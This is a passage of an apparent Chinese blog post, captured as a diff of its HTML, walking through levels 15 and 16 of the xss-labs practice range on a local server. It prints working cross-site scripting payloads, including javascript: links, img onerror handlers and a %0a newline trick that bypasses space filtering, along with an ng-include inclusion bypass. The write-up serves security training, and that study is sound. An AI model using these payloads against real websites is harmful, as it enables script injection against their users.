+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725211733741.png" alt="" /></p>
+<p>先看参数t_sort，想通过覆盖type属性的值就要闭合双引号，就会被转义，是行不通的，那就通过t_ref参数，修改ref头来进行xss</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725212135352.png" alt="" /></p>
+<h2 id="level15"><a class="markdownIt-Anchor" href="#level15"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level15.php">level15</a></h2>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725221316368.png" alt="image-20250725221316267" /></p>
+<p>其中：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span <span class="keyword">class</span>=<span class="string">&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<p><code>ng-include</code>类似于php的文件包含</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011127019/article/details/53666528">ng-include</a> 指令用于包含外部的 HTML文件，包含的内容将作为指定元素的子节点，ng-include 属性的值可以是一个表达式，返回一个文件名，默认情况下，包含的文件需要包含在同一个域名下</p>
+<p>特别值得注意的几点如下：</p>
+<ul>
+<li>ng-include,如果<mark>单纯指定地址，必须要加引号</mark></li>
+<li>ng-include,<mark>加载外部html，script标签中的内容不执行</mark></li>
+<li>ng-include,<mark>加载外部html中含有style标签样式可以识别</mark></li>
+<li>ng-inclue,<mark>记载外部html中的link标签可以加载</mark></li>
+</ul>
+</blockquote>
+<p>我们先试试看包涵第一关，构建payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=<span class="string">&#x27;/level1.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725222133382.png" alt="image-20250725222133231" /></p>
+<p>注意，这里不能包涵那些直接弹窗的东西如<code>&lt;script&gt;</code>，但是可以包涵那些标签的东西比如<code>&lt;a&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;p&gt;</code>标签等等，这些标签是能需要我们手动点击弹窗的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?src=<span class="string">&#x27;level1.php?name=&lt;a href=&#x27;</span><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&#x27;&gt;xss&lt;/a&gt;&#x27;</span><span class="comment">//错误的，自己看着点单双引号</span></span><br><span class="line">?src=<span class="string">&#x27;level1.php?name=&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;&#x27;</span><span class="comment">//正确的</span></span><br><span class="line">?src=<span class="string">&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)/&gt;&#x27;</span><span class="comment">//错误的，不要加&#x27;/&#x27;</span></span><br><span class="line">?src=<span class="string">&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><span class="comment">//正确的</span></span><br></pre></td></tr></table></figure>
+<p><mark>总结：ng-include文件包涵，可以无视html实体化</mark></p>
+<h2 id="level16"><a class="markdownIt-Anchor" href="#level16"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8800/level16.php?keyword=test">level16</a></h2>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250725224923302.png" alt="image-20250725224923234" /></p>
+<p>将<code>script</code>、<code> </code>、<code>/</code>转化为空格的html实体化形式，可以用回车的URL编码<code>%0a</code>代替空格绕过，再配合上不用/的<code>&lt;img&gt;</code>、<code>&lt;svg&gt;</code>等标签</p>
+<p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="language-xml">&lt;img%0asrc=1%0aonerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>参考：<br />
+<a target="_blank" rel="noopener" href="https://blog.potatowo.top/2023/02/09/XSS/">XSS-potatowo</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125638898">xss-labs靶场实战全通关详细过程（xss靶场详解）</a></p>
+</blockquote>
 
 <div class="article-footer fs14">
     <section id="license">
@@ -125,7 +265,7 @@
     </section>
     </div>
 </article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/07/21/HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/">HTTP参数污染</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/07/16/sqlmap%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/">sqlmap自动注入</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/07/28/sqli-labs/">sqli-labs</a></div></section></div>
 
 
 
@@ -183,7 +323,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E6%8E%A2docker"><span class="toc-text"> 初探Docker</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%89%E5%8C%96"><span class="toc-text"> 汉化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E9%95%9C%E5%83%8F%E6%97%B6%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86"><span class="toc-text"> 构造镜像时报错处理</span></a></li></ol></li></ol></div><div class="widget-footer">
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss-labs"><span class="toc-text"> xss-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-text"> level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-text"> level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level5"><span class="toc-text"> level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level6"><span class="toc-text"> level6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level7"><span class="toc-text"> level7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level8"><span class="toc-text"> level8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level9"><span class="toc-text"> level9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level10"><span class="toc-text"> level10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level11"><span class="toc-text"> level11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level15"><span class="toc-text"> level15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level16"><span class="toc-text"> level16</span></a></li></ol></li></ol></div><div class="widget-footer">
 
 <a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
 </div></aside><div class='float-panel blur'>
